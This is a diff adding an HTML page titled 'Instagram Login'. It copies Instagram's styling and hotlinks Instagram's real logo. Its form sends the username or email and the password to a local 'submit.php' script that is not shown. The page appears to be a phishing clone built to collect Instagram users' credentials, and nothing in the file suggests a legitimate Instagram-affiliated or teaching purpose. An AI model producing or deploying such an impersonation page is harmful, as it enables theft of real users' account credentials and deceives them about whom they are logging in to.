@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Instagram Login</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<style>
+		body {
+			font-family: Arial, sans-serif;
+			background-color: #fafafa;
+		}
+		.container {
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			justify-content: center;
+			height: 100vh;
+		}
+		.logo {
+			margin-bottom: 40px;
+		}
+		form {
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			background-color: white;
+			padding: 40px;
+			border: 1px solid #dbdbdb;
+			border-radius: 3px;
+			box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+			width: 350px;
+			max-width: 90%;
+		}
+		form input {
+			background-color: #fafafa;
+			border: 1px solid #dbdbdb;
+			border-radius: 3px;
+			padding: 10px;
+			margin-bottom: 15px;
+			width: 100%;
+			box-sizing: border-box;
+			font-size: 14px;
+		}
+		form button {
+			background-color: #0095f6;
+			color: white;
+			border: none;
+			border-radius: 3px;
+			padding: 10px;
+			font-weight: bold;
+			width: 100%;
+			margin-bottom: 15px;
+			font-size: 14px;
+			cursor: pointer;
+			transition: background-color 0.3s ease;
+		}
+		form button:hover {
+			background-color: #0080c9;
+		}
+		form a {
+			color: #0095f6;
+			font-size: 14px;
+			text-align: center;
+			text-decoration: none;
+			margin-top: 15px;
+			transition: color 0.3s ease;
+		}
+		form a:hover {
+			color: #0080c9;
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+		<form action="submit.php" method="post">
+			<input type="text" name="username_or_email" placeholder="Username or email">
+			<input type="password" name="password" placeholder="Password">
+			<button type="submit">Log In</button>
+			<a href="#">Forgot password?</a>
+		</form>
+	</div>
+</body>
+</html>
